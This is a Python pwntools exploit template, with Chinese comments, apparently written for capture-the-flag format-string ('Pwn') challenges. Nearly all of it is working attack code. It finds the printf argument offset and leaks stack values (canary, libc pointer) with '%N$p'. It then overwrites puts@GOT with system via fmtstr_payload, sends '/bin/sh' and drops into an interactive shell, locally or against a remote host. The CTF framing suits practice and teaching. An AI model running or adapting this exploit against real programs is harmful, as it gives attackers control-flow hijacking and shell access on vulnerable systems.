# -*- coding: utf-8 -*-
"""格式化字符串 Exploit 模板(pwntools)(补充题型: Pwn)

题型特征:
    printf(user_input) 直接输出 -> 泄露任意内存 / 写任意地址(%n)。

覆盖两类经典打法:
    A. 泄露: %7$p 连环泄露栈上数据 -> 拿 canary / libc
    B. 写入: fmtstr_payload(offset, {addr: value}) -> 改 GOT / 改返回值

依赖:
    pip install pwntools
用法:
    按题目改 OFFSET(第几个格式化参数, pwntools 上怪不了), 然后跑模板。
    python fmtstr_exp.py
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

LOCAL_BIN = './pwn'
OFFSET = 6                      # ← 64 位常见 6; 用下述 find_offset 实测


def find_offset(io):
    """自动测格式化字符串参数偏移(pwntools FmtStr)。"""
    fmt = FmtStr(execute_fmt=lambda s: (io.sendline(s.encode()) or io.recvline()))
    return fmt.offset


def leak_stack(io, count=8):
    for i in range(count, count + 8):
        io.sendline(f'%{i}$p'.encode())
        val = io.recvline().strip()
        log.info(f'%{i}$p = {val.decode()}')
    # canary 通常是低字节 00 的 8 字节值; libc 地址以 7f 开头


def write_got(io, target_addr, value):
    """把 target_addr 处写成 value(64 位一次性 fmtstr_payload)。"""
    payload = fmtstr_payload(OFFSET, {target_addr: value}, write_size='byte')
    io.sendline(payload)


def main():
    elf = ELF(LOCAL_BIN, checksec=False)
    io = process(LOCAL_BIN) if not args.REMOTE else remote('node.example.com', 12345)

    # --- A. 泄露 libc(若 printf 前调用过 puts 等 libc 函数) ---
    io.sendlineafter(b'?', b'%9$p')              # ← 改成栈上存在 libc 指针的位置
    leak = int(io.recvline().strip(), 16)
    libc_base = leak - 0x024830                  # ← __libc_start_main+xx 偏移, 按实际 libc
    log.success(f'libc base = {libc_base:#x}')

    # --- B. 把 puts@got 改成 system, 触发 "sh" 参数 ---
    libc = ELF('./libc.so.6', checksec=False)    # ← 没给 libc 就用 LibcSearcher
    libc.address = libc_base
    system = libc.sym['system']
    write_got(io, elf.got['puts'], system)
    io.sendlineafter(b'?', b'/bin/sh')           # 让 puts("...") 变 system("...")
    io.interactive()


if __name__ == '__main__':
    main()
